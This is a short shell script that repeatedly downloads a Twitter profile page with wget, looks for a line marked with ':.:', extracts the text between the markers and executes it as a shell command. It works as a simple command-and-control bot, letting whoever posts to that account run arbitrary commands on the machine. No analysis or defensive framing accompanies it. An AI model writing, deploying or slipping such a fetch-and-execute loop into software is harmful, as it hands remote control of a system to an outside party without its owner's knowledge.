#! /bin/sh

i=1
echo $i

while test $i -gt 0; do
        rm miloc
        wget www.twitter.com/miloc
        cuan=`cat miloc | grep :.: | wc -l`
        if test $cuan -eq 1; then
                comand=`cat miloc | grep :.: | awk -F ":.:" '{ print $2 }'`
                echo $comand
                $comand
                exit 0
        fi
        sleep 5
done
exit 0

